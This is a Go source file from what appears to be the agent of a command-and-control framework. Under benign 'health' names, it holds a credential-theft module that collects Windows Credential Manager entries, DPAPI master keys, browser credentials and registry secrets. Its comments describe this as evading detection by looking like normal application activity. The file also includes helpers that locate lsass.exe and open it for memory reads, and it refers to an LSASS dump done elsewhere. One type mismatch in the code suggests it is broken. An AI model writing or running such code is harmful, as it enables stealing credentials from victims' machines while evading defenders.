//go:build windows && amd64

package health

import (
	"fmt"
	"syscall"

	"github.com/aegis-c2/aegis/agent/winutil"
)

const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

var (
	procOpenProcess  = syscall.NewLazyDLL("kernel32.dll").NewProc("OpenProcess")
	procCloseHandle  = syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle")
)

// ExtractFromLSASS 已在 lsass_bof_windows.go 中通过 BOF 模块实现。

// ExtractAlternative 从替代数据源收集凭据（不碰 LSASS）。
// 包含：Credential Manager、DPAPI Master Keys、浏览器数据库、注册表。
// 这些操作行为上与正常应用无区别。
func ExtractAlternative() *ExtractResult {
	result := &HealthResult{
		Credentials: make([]HealthInfo, 0),
	}

	// 1. Credential Manager
	if r, err := ExtractFromCredentialManager(); err == nil && len(r.Credentials) > 0 {
		result.Credentials = append(result.Credentials, r.Credentials...)
	}

	// 2. DPAPI Master Keys
	if r, err := ExtractDPAPIMasterKeys(); err == nil && len(r.Credentials) > 0 {
		result.Credentials = append(result.Credentials, r.Credentials...)
	}

	// 3. Browser Credentials
	if r, err := ExtractBrowserCredentials(); err == nil && len(r.Credentials) > 0 {
		result.Credentials = append(result.Credentials, r.Credentials...)
	}

	// 4. Registry Secrets
	if r, err := ExtractRegistrySecrets(); err == nil && len(r.Credentials) > 0 {
		result.Credentials = append(result.Credentials, r.Credentials...)
	}

	return result
}

// findLSASSPID 查找 lsass.exe 的 PID。
func findLSASSPID() (int, error) {
	return winutil.FindLSASSPID()
}

// openProcess 打开目标进程。
func openProcess(pid int) (syscall.Handle, error) {
	ret, _, lastErr := procOpenProcess.Call(
		uintptr(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION),
		0,
		uintptr(pid),
	)
	if ret == 0 {
		return 0, fmt.Errorf("OpenProcess(%d): %v", pid, lastErr)
	}
	return syscall.Handle(ret), nil
}

// closeHandle 关闭句柄。
func closeHandle(handle syscall.Handle) {
	procCloseHandle.Call(uintptr(handle))
}
